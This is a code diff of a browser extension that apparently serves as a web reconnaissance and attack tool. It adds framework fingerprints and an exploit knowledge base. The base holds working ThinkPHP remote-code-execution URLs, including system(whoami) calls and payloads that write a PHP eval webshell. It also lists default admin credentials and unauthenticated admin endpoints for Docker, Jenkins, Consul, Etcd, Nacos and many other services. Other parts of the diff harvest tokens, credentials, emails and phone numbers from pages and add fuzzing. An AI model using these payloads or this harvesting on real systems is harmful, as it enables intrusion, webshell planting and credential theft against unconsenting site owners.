@@ -55,13 +55,353 @@ class SvFwDetect {
     {n:'Vite',k:'vite',p:'',m:['VITE_GLOB','@vitejs','vite-plugin','import.meta.hot']},
     {n:'ECharts',k:'echarts',p:'',m:['echarts','echarts.init','zrender']},
     {n:'jQuery',k:'jquery',p:'',m:['jQuery','$.ajax','$.get']},
-    {n:'Node.js',k:'nodejs',p:'/api',m:['process.env','__dirname','require(','module.exports','Buffer.from']}
+    {n:'Node.js',k:'nodejs',p:'/api',m:['process.env','__dirname','require(','module.exports','Buffer.from']},
+    {n:'Jenkins',k:'jenkins',p:'',m:['jenkins','Dashboard [Jenkins]','X-Jenkins','/script','/job/']},
+    {n:'Elasticsearch',k:'elasticsearch',p:'',m:['elasticsearch','ES_','/_cat/master','/_search','/_cluster/settings','kibana']},
+    {n:'Kibana',k:'kibana',p:'',m:['kibana','kbn-name','kbn-version','.kibana']},
+    {n:'Swagger',k:'swagger',p:'',m:['swagger','Swagger','/swagger-ui','/api-docs','OpenAPI','/v2/api-docs']},
+    {n:'Docker',k:'docker',p:'',m:['docker','container','/containers/json','/images/json','dockerfile','FROM alpine']},
+    {n:'CouchDB',k:'couchdb',p:'',m:['couchdb','/_utils/','Welcome to CouchDB']},
+    {n:'Solr',k:'solr',p:'',m:['solr','Apache Solr','/solr/']},
+    {n:'Druid',k:'druid',p:'',m:['druid','Druid Console','/druid/','druid.connection']},
+    {n:'phpMyAdmin',k:'phpmyadmin',p:'',m:['phpMyAdmin','phpmyadmin','PMA_token']},
+    {n:'RabbitMQ',k:'rabbitmq',p:'',m:['rabbitmq','RabbitMQ','/api/','amqp']},
+    {n:'MongoDB',k:'mongodb',p:'',m:['mongodb','mongod','mongo','/_admin/']},
+    {n:'Hadoop',k:'hadoop',p:'',m:['hadoop','Hadoop','yarn','/ws/v1/','/cluster/']},
+    {n:'ZooKeeper',k:'zookeeper',p:'',m:['zookeeper','ZooKeeper','/commands/','/sstz']},
+    {n:'ActiveMQ',k:'activemq',p:'',m:['activemq','ActiveMQ','/admin/','/api/']},
+    {n:'Zabbix',k:'zabbix',p:'',m:['zabbix','Zabbix','/zabbix/','zbx']},
+    {n:'GitLab',k:'gitlab',p:'',m:['gitlab','GitLab','/users/sign_in']},
+    {n:'Harbor',k:'harbor',p:'',m:['harbor','Harbor','/api/users']},
+    {n:'Grafana',k:'grafana',p:'',m:['grafana','Grafana','/api/datasources','/api/search']},
+    {n:'Consul',k:'consul',p:'',m:['consul','Consul','/:8500/','v1/catalog']},
+    {n:'Etcd',k:'etcd',p:'',m:['etcd','etcd','/:2379/','/v2/keys']},
+    {n:'Istio',k:'istio',p:'',m:['istio','Istio','/15000/','/stats/prometheus']},
+    {n:'WordPress',k:'wordpress',p:'',m:['wordpress','wp-content','wp-includes','/wp-admin/','wp-json']},
   ];const r=[];for(const s of sigs){let sc=0;for(const kw of s.m){if(text.includes(kw))sc+=30}if(sc>=60)r.push({name:s.n,key:s.k,prefix:s.p,score:sc})}return r.sort((a,b)=>b.score-a.score)}
   extractConfig(text){const cfg={};const ps=[[/VITE_GLOB_API_URL_PREFIX\s*[:=]\s*["']([^"']+)["']/,'apiPrefix'],[/VITE_GLOB_API_URL\s*[:=]\s*["']([^"']+)["']/,'apiUrl'],[/VITE_GLOB_UPLOAD_URL\s*[:=]\s*["']([^"']+)["']/,'uploadUrl'],[/VITE_GLOB_APP_TENANT_ENABLE\s*[:=]\s*["']([^"']+)["']/,'tenant'],[/VITE_GLOB_APP_CAPTCHA_ENABLE\s*[:=]\s*["']([^"']+)["']/,'captcha'],[/restfulUrl\s*[:=]\s*["']([^"']+)["']/,'restfulUrl'],[/api\s*[:=]\s*["']([^"']+)["']/,'apiHost'],[/baseURL\s*[:=]\s*["']([^"']+)["']/,'baseURL']];if(!text)return cfg;for(const[re,k]of ps){const m=text.match(re);if(m)cfg[k]=m[1]}return cfg}
 }
 
 class SvFingerprint {
   analyze(body,status){if(!body)return null;const fps=[{re:/"_links"[^}]{0,200}?(?:"actuator"|"heapdump"|"env"[^}]{0,100}?"href")/,t:'Actuator暴露!',r:'CRITICAL'},{re:/Whitelabel Error Page/,t:'Spring错误页',r:'HIGH'},{re:/thinkphp|ThinkPHP/,t:'ThinkPHP报错',r:'CRITICAL'},{re:/SQL syntax|mysql_fetch|SQLSTATE|ORA-/,t:'SQL错误',r:'CRITICAL'},{re:/Sensors Analytics is ready/,t:'神策Debug',r:'HIGH'},{re:/please provide valid app/,t:'API网关',r:'MEDIUM'},{re:/valid token is required/,t:'需认证',r:'INFO'},{re:/没有该操作权限|权限不足|access denied|forbidden/,t:'权限不足',r:'MEDIUM'},{re:/参数错误|参数不正确|missing parameter/,t:'参数校验',r:'INFO'},{re:/系统异常|系统内部错误|internal server error/,t:'服务端异常',r:'MEDIUM'},{re:/Index of \//,t:'目录遍历',r:'MEDIUM'},{re:/\.git\/HEAD|ref: refs\/heads/,t:'Git泄露',r:'CRITICAL'}];for(const fp of fps){if(fp.re.test(body))return{type:fp.t,risk:fp.r}}if(status===200&&body.startsWith('{')&&body.includes('"code":0'))return{type:'JSON成功',risk:'INFO'};if(status===500&&body.length>100)return{type:'500错误',risk:'MEDIUM'};return null}
+}
+
+// 框架漏洞利用知识库（攻击路径提示）
+const FW_EXPLOITS = {
+  thinkphp: { name: 'ThinkPHP', hints: [
+    { path: '/?s=_index/ini', type: 'RCE', desc: 'RCE — 加载配置执行PHP代码' },
+    { path: '/?s=index/\think\App/runtime', type: 'RCE', desc: 'RCE — think\App 路由调用' },
+    { path: '/?s=index/\think\Request/cache&var=1&value=system(whoami)', type: 'RCE', desc: 'RCE — Request缓存写入' },
+    { path: '/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami', type: 'RCE', desc: 'RCE — Container函数调用' },
+    { path: '/?s=index/\think\view\driver\Php/display&content=<?php system($_GET[1]);?>', type: 'RCE', desc: 'RCE — 视图写入webshell' },
+    { path: '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_POST[1]);?>', type: 'RCE', desc: 'RCE — 文件写入' },
+    { path: '/runtime/log/', type: 'INFO', desc: '日志目录' },
+    { path: '/application/database.php', type: 'INFO', desc: '数据库配置泄露' },
+    { path: '/application/config.php', type: 'INFO', desc: '框架配置泄露' },
+  ]},
+  spring: { name: 'Spring Boot', hints: [
+    { path: '/actuator/env', type: 'CRITICAL', desc: '环境变量泄露 — 可能含密钥' },
+    { path: '/actuator/heapdump', type: 'CRITICAL', desc: '堆转储 — 下载分析获取凭据' },
+    { path: '/actuator/mappings', type: 'HIGH', desc: '完整路由清单' },
+    { path: '/actuator/beans', type: 'HIGH', desc: 'Spring Bean列表 — 审计依赖' },
+    { path: '/actuator/configprops', type: 'HIGH', desc: '配置属性泄露' },
+    { path: '/actuator/threaddump', type: 'MEDIUM', desc: '线程dump — 找敏感操作' },
+    { path: '/actuator/loggers', type: 'MEDIUM', desc: '日志级别配置' },
+    { path: '/actuator/sessions', type: 'HIGH', desc: 'Spring Session列表' },
+    { path: '/actuator/refresh', type: 'MEDIUM', desc: '配置刷新端点' },
+    { path: '/jolokia/list', type: 'CRITICAL', desc: 'Jolokia — JNDI注入风险' },
+    { path: '/swagger-ui.html', type: 'HIGH', desc: 'Swagger API文档' },
+    { path: '/v2/api-docs', type: 'HIGH', desc: 'OpenAPI JSON' },
+    { path: '/webjars/swagger-ui/index.html', type: 'HIGH', desc: 'Swagger UI' },
+    { path: '/env', type: 'CRITICAL', desc: 'actuator env (同 /actuator/env)' },
+    { path: '/heapdump', type: 'CRITICAL', desc: 'actuator heapdump (同 /actuator/heapdump)' },
+  ]},
+  springcloud: { name: 'Spring Cloud', hints: [
+    { path: '/nacos/v1/cs/opss/switches', type: 'CRITICAL', desc: 'Nacos 未授权 — 禁用端点' },
+    { path: '/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdmx&group=DEFAULT_GROUP', type: 'CRITICAL', desc: 'Nacos 未授权配置读取' },
+    { path: '/nacos/v1/auth/users?pageNo=1&pageSize=100', type: 'CRITICAL', desc: 'Nacos 未授权用户列表' },
+    { path: '/gateway/mappings', type: 'HIGH', desc: 'Gateway路由映射' },
+    { path: '/gateway/routes', type: 'HIGH', desc: 'Gateway路由配置' },
+    { path: '/actuator/gateway/routes', type: 'HIGH', desc: 'Gateway路由端点' },
+    { path: '/eureka/**', type: 'MEDIUM', desc: 'Eureka服务发现' },
+  ]},
+  laravel: { name: 'Laravel', hints: [
+    { path: '/.env', type: 'CRITICAL', desc: '环境配置泄露 — 含DB密钥/APP_KEY' },
+    { path: '/.env.backup', type: 'CRITICAL', desc: '.env备份泄露' },
+    { path: '/storage/logs/laravel.log', type: 'HIGH', desc: 'Laravel日志 — 可能含报错信息' },
+    { path: '/vendor/autoload.php', type: 'HIGH', desc: 'Composer依赖泄露' },
+    { path: '/config/database.php', type: 'HIGH', desc: '数据库配置' },
+    { path: '/config/app.php', type: 'HIGH', desc: '应用配置含密钥' },
+    { path: '/_debugbar/open', type: 'HIGH', desc: 'DebugBar存储数据' },
+    { path: '/_profiler', type: 'HIGH', desc: 'Symfony Profiler' },
+    { path: '/api/user', type: 'MEDIUM', desc: '当前用户信息 (未鉴权)' },
+    { path: '/telescope', type: 'HIGH', desc: 'Telescope调试面板' },
+    { path: '/horizon', type: 'HIGH', desc: 'Horizon队列监控' },
+  ]},
+  shiro: { name: 'Apache Shiro', hints: [
+    { path: '/login', type: 'HIGH', desc: 'Shiro登录页 — 找rememberMe反序列化' },
+    { path: '/admin/index', type: 'HIGH', desc: '后台管理 — rememberMe未禁用则尝试反序列化' },
+    { path: 'rememberMe=deleteMe', type: 'INFO', desc: '检测响应头 — 确认使用了Shiro' },
+  ]},
+  yudao: { name: '芋道 Yudao', hints: [
+    { path: '/admin/login', type: 'HIGH', desc: '后台登录 — 尝试验证默认弱口令 admin/admin123' },
+    { path: '/generator/genTable', type: 'CRITICAL', desc: '代码生成 — 可生成恶意Java代码' },
+    { path: '/codegen/genCode', type: 'CRITICAL', desc: '代码生成RCE — 解压zip路径穿越写入class' },
+    { path: '/admin-api/system/config', type: 'HIGH', desc: '系统配置读取' },
+    { path: '/dict/data/type/sys_user_status', type: 'INFO', desc: '字典数据 — 枚举用户状态' },
+  ]},
+  ruoyi: { name: '若依 Ruoyi', hints: [
+    { path: '/login', type: 'HIGH', desc: '后台登录 — 尝试验证默认弱口令 admin/admin123' },
+    { path: '/user/profile', type: 'MEDIUM', desc: '个人中心 — 可能泄露用户信息' },
+    { path: '/getPerTreeUn', type: 'MEDIUM', desc: '获取菜单权限树' },
+    { path: '/system/role', type: 'HIGH', desc: '角色管理' },
+    { path: '/system/user/authRole/*', type: 'HIGH', desc: '分配用户角色' },
+    { path: '/system/menu/list', type: 'HIGH', desc: '菜单列表 — 找敏感接口' },
+    { path: '/monitor/online', type: 'MEDIUM', desc: '在线用户' },
+    { path: '/monitor/server', type: 'MEDIUM', desc: '服务器信息' },
+    { path: '/tool/gen/editTable/*', type: 'HIGH', desc: '代码生成表编辑' },
+    { path: '/tool/gen/batchGenCode', type: 'CRITICAL', desc: '批量生成代码 — 尝试RCE' },
+  ]},
+  fastapi: { name: 'FastAPI', hints: [
+    { path: '/docs', type: 'HIGH', desc: 'Swagger UI文档' },
+    { path: '/redoc', type: 'HIGH', desc: 'ReDoc文档' },
+    { path: '/openapi.json', type: 'HIGH', desc: 'OpenAPI JSON — 完整API定义' },
+    { path: '/openapi.yaml', type: 'HIGH', desc: 'OpenAPI YAML' },
+    { path: '/api/v1/users', type: 'MEDIUM', desc: '用户接口' },
+    { path: '/api/v1/items', type: 'MEDIUM', desc: '物品接口' },
+    { path: '/debug/tb', type: 'HIGH', desc: 'Python traceback — 调试信息' },
+  ]},
+  django: { name: 'Django', hints: [
+    { path: '/admin/login/', type: 'HIGH', desc: 'Django管理后台' },
+    { path: '/admin/', type: 'HIGH', desc: 'Django Admin' },
+    { path: '/static/admin/', type: 'MEDIUM', desc: '管理后台静态文件' },
+    { path: '/__debug__/', type: 'HIGH', desc: 'Django Debug模式' },
+    { path: '/api/v1/', type: 'MEDIUM', desc: 'REST API端点' },
+    { path: '/schema.swagger-ui/', type: 'HIGH', desc: 'Swagger文档' },
+    { path: '/swagger.json', type: 'HIGH', desc: 'OpenAPI JSON' },
+  ]},
+  aspnet: { name: 'ASP.NET', hints: [
+    { path: '/elmah.axd', type: 'CRITICAL', desc: 'ELMAH错误日志 — 可能含敏感信息' },
+    { path: '/trace.axd', type: 'HIGH', desc: 'ASP.NET跟踪' },
+    { path: '/WebResource.axd', type: 'MEDIUM', desc: '嵌入资源' },
+    { path: '/ScriptResource.axd', type: 'MEDIUM', desc: '脚本资源' },
+    { path: '/Health', type: 'MEDIUM', desc: '健康检查' },
+    { path: '/api-docs', type: 'HIGH', desc: 'API文档' },
+    { path: '/swagger', type: 'HIGH', desc: 'Swagger UI' },
+    { path: '/appsettings.json', type: 'HIGH', desc: '应用配置' },
+  ]},
+  vue: { name: 'Vue.js', hints: [
+    { path: '/api/', type: 'MEDIUM', desc: 'API路径探测 — 尝试/api/admin/*等' },
+    { path: '/config/', type: 'HIGH', desc: '前端配置 — VITE_GLOB_API_URL等' },
+    { path: '/prod.api.js', type: 'HIGH', desc: 'Webpack打包产物 — 找API路径' },
+    { path: '/js/app.', type: 'HIGH', desc: '主bundle — 可能含API地址' },
+    { path: '/chunk-vendors.', type: 'MEDIUM', desc: '第三方库bundle' },
+  ]},
+  nextjs: { name: 'Next.js', hints: [
+    { path: '/api/', type: 'HIGH', desc: 'API Routes — 全都试试' },
+    { path: '/_next/data/', type: 'HIGH', desc: 'SSR数据端点' },
+    { path: '/_next/static/', type: 'MEDIUM', desc: '静态资源' },
+    { path: '/api/_next/image', type: 'MEDIUM', desc: '图片优化端点' },
+    { path: '/api/auth/', type: 'HIGH', desc: 'Auth API — 找登录/注册' },
+    { path: '/api/users/', type: 'HIGH', desc: '用户API' },
+  ]},
+  fastjson: { name: 'Fastjson', hints: [
+    { path: '/', type: 'CRITICAL', desc: '尝试JSON反序列化 — 找未授权接口' },
+    { path: '/login', type: 'CRITICAL', desc: '登录接口 — 找反序列化点' },
+    { path: '/api/', type: 'CRITICAL', desc: 'API接口 — 抓包分析参数' },
+  ]},
+  jenkins: { name: 'Jenkins', hints: [
+    { path: '/script', type: 'CRITICAL', desc: '未授权 — Groovy脚本执行' },
+    { path: '/systemInfo', type: 'HIGH', desc: '系统信息泄露' },
+    { path: '/people', type: 'MEDIUM', desc: '用户列表' },
+    { path: '/configureSecurity', type: 'HIGH', desc: '安全配置 — 可修改授权策略' },
+    { path: '/api/json?tree=jobs[url,name]', type: 'HIGH', desc: 'API — 遍历所有Job' },
+  ]},
+  elasticsearch: { name: 'Elasticsearch', hints: [
+    { path: '/_cat/master', type: 'CRITICAL', desc: '未授权 — 获取Master节点信息' },
+    { path: '/_cat/indices', type: 'HIGH', desc: '未授权 — 列出所有索引' },
+    { path: '/_search?size=100', type: 'HIGH', desc: '未授权 — 搜索数据' },
+    { path: '/_nodes/stats', type: 'HIGH', desc: '节点状态' },
+    { path: '/_aliases', type: 'MEDIUM', desc: '索引别名' },
+  ]},
+  kibana: { name: 'Kibana', hints: [
+    { path: '/app/kibana', type: 'MEDIUM', desc: 'Kibana管理界面' },
+    { path: '/api/status', type: 'HIGH', desc: 'Kibana状态' },
+    { path: '/api/saved_objects/_find', type: 'HIGH', desc: '未授权 — 查找已保存对象' },
+    { path: '/app/timelion', type: 'HIGH', desc: 'Timelion时间序列' },
+  ]},
+  swagger: { name: 'Swagger UI', hints: [
+    { path: '/swagger-ui.html', type: 'HIGH', desc: 'Swagger文档 — 找API接口' },
+    { path: '/swagger-ui/', type: 'HIGH', desc: 'Swagger文档' },
+    { path: '/api-docs', type: 'HIGH', desc: 'OpenAPI JSON' },
+    { path: '/v1/api-docs', type: 'HIGH', desc: 'OpenAPI v1' },
+    { path: '/v2/api-docs', type: 'HIGH', desc: 'OpenAPI v2' },
+  ]},
+  docker: { name: 'Docker API', hints: [
+    { path: ':2375/version', type: 'CRITICAL', desc: 'Docker未授权 — 远程管理' },
+    { path: ':2376/version', type: 'CRITICAL', desc: 'Docker TLS未授权' },
+    { path: ':2375/containers/json', type: 'CRITICAL', desc: '列出所有容器' },
+    { path: ':2375/images/json', type: 'HIGH', desc: '列出所有镜像' },
+    { path: ':2375/volumes', type: 'HIGH', desc: '列出所有卷' },
+  ]},
+  couchdb: { name: 'CouchDB', hints: [
+    { path: '/_utils/', type: 'HIGH', desc: 'CouchDB Web界面' },
+    { path: '/_all_dbs', type: 'CRITICAL', desc: '未授权 — 列出所有数据库' },
+    { path: '/_session', type: 'HIGH', desc: 'Session信息' },
+    { path: '/_user/', type: 'HIGH', desc: '用户数据库' },
+  ]},
+  solr: { name: 'Apache Solr', hints: [
+    { path: '/solr/', type: 'MEDIUM', desc: 'Solr管理界面' },
+    { path: '/solr/admin/ping', type: 'HIGH', desc: '健康检查' },
+    { path: '/solr/#/core_name/query', type: 'HIGH', desc: 'Solr查询界面' },
+    { path: '/solr/core_name/config', type: 'HIGH', desc: '修改配置' },
+  ]},
+  druid: { name: 'Druid', hints: [
+    { path: '/druid/index.html', type: 'CRITICAL', desc: 'Druid监控台 — 未授权访问' },
+    { path: '/druid/sql.html', type: 'CRITICAL', desc: 'SQL监控 — 未授权' },
+    { path: '/druid/datasource.html', type: 'CRITICAL', desc: '数据源监控' },
+    { path: '/druid/weburi-spring.json', type: 'HIGH', desc: 'Spring URI配置' },
+    { path: '/druid/api.json', type: 'HIGH', desc: 'API信息' },
+  ]},
+  phpmyadmin: { name: 'phpMyAdmin', hints: [
+    { path: '/phpmyadmin/', type: 'CRITICAL', desc: 'phpMyAdmin — 弱口令/未授权' },
+    { path: '/pma/', type: 'CRITICAL', desc: 'phpMyAdmin别名' },
+    { path: '/myadmin/', type: 'CRITICAL', desc: 'phpMyAdmin别名' },
+    { path: '/phpMyAdmin/', type: 'CRITICAL', desc: 'phpMyAdmin大小写变体' },
+  ]},
+  rabbitmq: { name: 'RabbitMQ', hints: [
+    { path: ':15672/', type: 'CRITICAL', desc: 'RabbitMQ管理界面 — 弱口令/未授权' },
+    { path: ':15692/', type: 'CRITICAL', desc: 'RabbitMQ Prometheus指标' },
+    { path: ':25672/', type: 'MEDIUM', desc: 'RabbitMQ分布式端口' },
+    { path: '/api/nodes', type: 'HIGH', desc: 'API获取节点信息' },
+  ]},
+  mongodb: { name: 'MongoDB', hints: [
+    { path: ':27017/', type: 'CRITICAL', desc: 'MongoDB Web界面' },
+    { path: '/_admin/buildinfo', type: 'HIGH', desc: 'MongoDB管理' },
+    { path: '/_admin/serversStatus', type: 'HIGH', desc: '服务器状态' },
+  ]},
+  hadoop: { name: 'Hadoop YARN', hints: [
+    { path: ':8088/cluster', type: 'CRITICAL', desc: 'YARN集群管理 — 未授权' },
+    { path: ':8088/ws/v1/cluster/apps', type: 'CRITICAL', desc: '列出所有应用' },
+    { path: ':8088/cluster/nodes', type: 'HIGH', desc: '节点管理' },
+    { path: ':19888/jobhistory', type: 'HIGH', desc: 'Hadoop JobHistory' },
+    { path: ':19888/cluster/app', type: 'HIGH', desc: '应用信息' },
+  ]},
+  zookeeper: { name: 'ZooKeeper', hints: [
+    { path: ':2181/', type: 'CRITICAL', desc: 'ZooKeeper未授权 — 远程命令执行' },
+    { path: ':2181/commands/stats', type: 'HIGH', desc: 'ZooKeeper统计' },
+    { path: ':2181/commands/conf', type: 'HIGH', desc: 'ZooKeeper配置' },
+    { path: ':2181/commands/envi', type: 'HIGH', desc: 'ZooKeeper环境' },
+    { path: ':2181/commands/srst', type: 'HIGH', desc: 'ZooKeeper状态重置' },
+  ]},
+  rsync: { name: 'Rsync', hints: [
+    { path: ':873/', type: 'CRITICAL', desc: 'Rsync未授权 — 文件同步' },
+    { path: 'rsync://target/', type: 'HIGH', desc: '列出Rsync模块' },
+  ]},
+  ldap: { name: 'LDAP', hints: [
+    { path: ':389/', type: 'CRITICAL', desc: 'LDAP未授权 — 目录遍历' },
+    { path: ':636/', type: 'CRITICAL', desc: 'LDAPS未授权' },
+  ]},
+  nfs: { name: 'NFS', hints: [
+    { path: ':2049/', type: 'CRITICAL', desc: 'NFS未授权 — 文件共享' },
+    { path: ':20048/', type: 'CRITICAL', desc: 'NFS mountd未授权' },
+  ]},
+  activemq: { name: 'ActiveMQ', hints: [
+    { path: ':8161/admin/', type: 'CRITICAL', desc: 'ActiveMQ管理界面 — 弱口令/未授权' },
+    { path: ':8161/api/message', type: 'HIGH', desc: '消息队列API' },
+    { path: ':61616/', type: 'HIGH', desc: 'ActiveMQ OpenWire' },
+  ]},
+  zabbix: { name: 'Zabbix', hints: [
+    { path: ':10051/zabbix.php', type: 'CRITICAL', desc: 'Zabbix监控 — 弱口令/未授权' },
+    { path: '/zabbix/', type: 'CRITICAL', desc: 'Zabbix Web' },
+    { path: '/api_jsonrpc.php', type: 'HIGH', desc: 'Zabbix API' },
+  ]},
+  gitlab: { name: 'GitLab', hints: [
+    { path: '/users/sign_in', type: 'MEDIUM', desc: 'GitLab登录页' },
+    { path: '/api/v4/projects', type: 'HIGH', desc: 'API — 列出公开项目' },
+    { path: '/explore', type: 'HIGH', desc: '探索页 — 公开项目' },
+    { path: '/help', type: 'MEDIUM', desc: 'GitLab帮助文档' },
+  ]},
+  harbor: { name: 'Harbor', hints: [
+    { path: '/api/users', type: 'CRITICAL', desc: 'Harbor未授权 — 注册管理员' },
+    { path: '/api/v2.0/registries', type: 'HIGH', desc: '列出 registries' },
+    { path: '/api/v2.0/projects', type: 'HIGH', desc: '列出项目' },
+    { path: '/chartrepo/library/index.yaml', type: 'HIGH', desc: 'Helm charts' },
+  ]},
+  grafana: { name: 'Grafana', hints: [
+    { path: '/api/datasources', type: 'CRITICAL', desc: '未授权 — 数据源信息' },
+    { path: '/api/search', type: 'HIGH', desc: '搜索Dashboards' },
+    { path: '/api/teams', type: 'HIGH', desc: '团队信息' },
+    { path: '/api/org', type: 'HIGH', desc: '组织信息' },
+    { path: '/api/plugins', type: 'MEDIUM', desc: '插件列表' },
+  ]},
+  consul: { name: 'Consul', hints: [
+    { path: ':8500/ui/', type: 'CRITICAL', desc: 'Consul Web界面 — 未授权' },
+    { path: ':8500/v1/catalog/services', type: 'CRITICAL', desc: '未授权 — 服务目录' },
+    { path: ':8500/v1/kv/?recurse', type: 'CRITICAL', desc: '未授权 — KV存储' },
+    { path: ':8500/v1/agent/services', type: 'HIGH', desc: 'Agent服务' },
+  ]},
+  etcd: { name: 'Etcd', hints: [
+    { path: ':2379/version', type: 'CRITICAL', desc: 'Etcd版本信息' },
+    { path: ':2379/v2/keys/', type: 'CRITICAL', desc: '未授权 — KV存储' },
+    { path: ':2379/v3/kv/range', type: 'CRITICAL', desc: 'gRPC KV API' },
+    { path: ':2380/', type: 'MEDIUM', desc: 'Etcd Peer通信' },
+  ]},
+  istio: { name: 'Istio', hints: [
+    { path: ':15000/stats/prometheus', type: 'HIGH', desc: 'Envoy统计指标' },
+    { path: ':15090/stats/prometheus', type: 'HIGH', desc: 'Envoy Prometheus指标' },
+    { path: '/healthz/ready', type: 'MEDIUM', desc: 'Istio健康检查' },
+    { path: '/debug', type: 'HIGH', desc: '调试端点' },
+  ]},
+  wordpress: { name: 'WordPress', hints: [
+    { path: '/wp-admin/', type: 'HIGH', desc: 'WordPress后台' },
+    { path: '/xmlrpc.php', type: 'HIGH', desc: 'XML-RPC — 爆破/SSRF' },
+    { path: '/wp-login.php', type: 'HIGH', desc: 'WordPress登录' },
+    { path: '/wp-json/wp/v2/users', type: 'CRITICAL', desc: '未授权 — 用户信息泄露' },
+    { path: '/wp-config.php', type: 'CRITICAL', desc: '配置文件泄露' },
+  ]},
+}
+
+// 框架key到FW_EXPLOITS key的映射
+const FW_KEY_MAP = {
+  'spring': 'spring', 'springboot': 'spring',
+  'springcloud': 'springcloud', 'spring_cloud': 'springcloud',
+  'thinkphp': 'thinkphp',
+  'laravel': 'laravel',
+  'shiro': 'shiro',
+  'yudao': 'yudao', '芋道': 'yudao',
+  'ruoyi': 'ruoyi', '若依': 'ruoyi',
+  'fastapi': 'fastapi',
+  'django': 'django',
+  'aspnet': 'aspnet', 'asp.net': 'aspnet',
+  'vue': 'vue', 'vuejs': 'vue',
+  'nextjs': 'nextjs', 'next.js': 'nextjs',
+  'fastjson': 'fastjson',
+  'jenkins': 'jenkins',
+  'elasticsearch': 'elasticsearch',
+  'kibana': 'kibana',
+  'swagger': 'swagger',
+  'docker': 'docker',
+  'couchdb': 'couchdb',
+  'solr': 'solr',
+  'druid': 'druid',
+  'phpmyadmin': 'phpmyadmin',
+  'rabbitmq': 'rabbitmq',
+  'mongodb': 'mongodb',
+  'hadoop': 'hadoop',
+  'zookeeper': 'zookeeper',
+  'rsync': 'rsync',
+  'ldap': 'ldap',
+  'nfs': 'nfs',
+  'activemq': 'activemq',
+  'zabbix': 'zabbix',
+  'gitlab': 'gitlab',
+  'harbor': 'harbor',
+  'grafana': 'grafana',
+  'consul': 'consul',
+  'etcd': 'etcd',
+  'istio': 'istio',
+  'wordpress': 'wordpress',
 }
 
 const THIRD_PARTY_DOMAINS = [
@@ -93,18 +433,21 @@ function isThirdParty(url) {
 
 const tabs = new Map()
 const fetchingUrls = new Map()
-function T(id) { if (!tabs.has(id)) tabs.set(id, { apis: [], fw: [], cfg: {}, jsN: 0, url: '', domains: [], ips: [], jwts: [], creds: [], storageItems: [], runtimeReqs: [], bodyParams: [], wap: [] }); return tabs.get(id) }
+// 已下载完成的 JS URL 集合 (跨 tab 共享), webRequest 与 content.js passive 双路去重
+const downloadedUrls = new Set()
+function T(id) { if (!tabs.has(id)) tabs.set(id, { apis: [], fw: [], cfg: {}, jsN: 0, url: '', domains: [], ips: [], jwts: [], creds: [], storageItems: [], runtimeReqs: [], bodyParams: [], wap: [], phones: [], githubRepos: [], params: [], processing: false }); return tabs.get(id) }
 function getFetching(tabId) { if (!fetchingUrls.has(tabId)) fetchingUrls.set(tabId, new Set()); return fetchingUrls.get(tabId) }
 
 // === SW persistence: restore on startup, save periodically ===
 (async function restoreState() {
   try {
-    const stored = await chrome.storage.session.get('tabSnapshots')
+    // Try session first, then local for persistence across SW restarts
+    let stored = await chrome.storage.session.get('tabSnapshots').catch(() => ({}))
+    if (!stored.tabSnapshots) stored = await chrome.storage.local.get('tabSnapshots_backup').catch(() => ({}))
     if (stored.tabSnapshots) {
       for (const [id, data] of Object.entries(stored.tabSnapshots)) {
         const numId = parseInt(id)
         if (!tabs.has(numId)) {
-          // restore with fresh maps/arrays
           tabs.set(numId, { ...data, processing: false })
         }
       }
@@ -117,7 +460,11 @@ function persistState() {
     tabs.forEach((v, k) => {
       if (v.apis?.length || v.domains?.length) snap[k] = { ...v, processing: false }
     })
-    if (Object.keys(snap).length) chrome.storage.session.set({ tabSnapshots: snap })
+    if (Object.keys(snap).length) {
+      chrome.storage.session.set({ tabSnapshots: snap })
+      // Backup to storage.local periodically so state survives service worker restart
+      chrome.storage.local.set({ tabSnapshots_backup: snap, _persistTs: Date.now() })
+    }
   } catch (e) { /* ignore */ }
 }
 setInterval(persistState, 5000) // every 5s
@@ -125,7 +472,8 @@ setInterval(persistState, 5000) // every 5s
 // === content发来的被动数据 ===
 chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
   if (msg.action === 'passive') {
-    const t = T(sender.tab?.id); if (!sender.tab?.id) return
+    if (!sender.tab?.id) return // 修复: 原代码在判空前调用 T(undefined) 会创建幽灵 Map 条目
+    const t = T(sender.tab.id)
     t.url = msg.url; t.title = msg.title
     // 合并框架 (不覆盖)
     if (msg.fw?.length) {
@@ -148,6 +496,13 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
     mergeList('ips', msg.ips)
     mergeList('jwts', msg.jwts)
     mergeList('creds', msg.creds)
+    mergeList('phones', msg.phones)
+    mergeList('githubRepos', msg.githubs)
+    // emails 也属于凭据类, 合并到 creds 保留; cookies/companies 暂不存储 (干扰大、价值低)
+    if (msg.emails?.length) {
+      const existVal = new Set((t.creds || []).map(x => Array.isArray(x) ? x[0] : (typeof x === 'string' ? x : (x.value ?? x))))
+      for (const e of msg.emails) { if (e && !existVal.has(e)) { t.creds.push([e, 'email']); existVal.add(e) } }
+    }
     // storage scan results
     if (msg.storageItems?.length) {
       const exist = new Set(t.storageItems)
@@ -191,10 +546,24 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
     downloadJS(sender.tab.id, msg.tasks || [])
     sendResponse({ ok: true })
   }
-  if (msg.action === 'getData') { chrome.tabs.query({ active: true, currentWindow: true }, ([t]) => { const d = t ? T(t.id) : {}; sendResponse({ ...d, tabId: t?.id, capturedToken: d._token || '' }) }); return true }
-  if (msg.action === 'storeToken') { if (sender.tab?.id) T(sender.tab.id)._token = msg.token; return true }
+  if (msg.action === 'getData') { chrome.tabs.query({ active: true, currentWindow: true }, ([t]) => { const d = t ? T(t.id) : {}; sendResponse({ ...d, tabId: t?.id, capturedToken: d._token || '', fwExploits: FW_EXPLOITS, fwKeyMap: FW_KEY_MAP }) }); return true }
+  if (msg.action === 'storeToken') { if (sender.tab?.id) T(sender.tab.id)._token = msg.token; sendResponse({ ok: true }); return } // 修复: 不再 return true, 避免消息通道悬挂
+  if (msg.action === 'siteAnalysis') { handleSiteAnalysis(msg, sender, sendResponse); return true }
   if (msg.action === 'fuzz') { fuzzURL(msg.url, msg.method, { ...msg.headers, _tabId: sender.tab?.id }).then(sendResponse); return true }
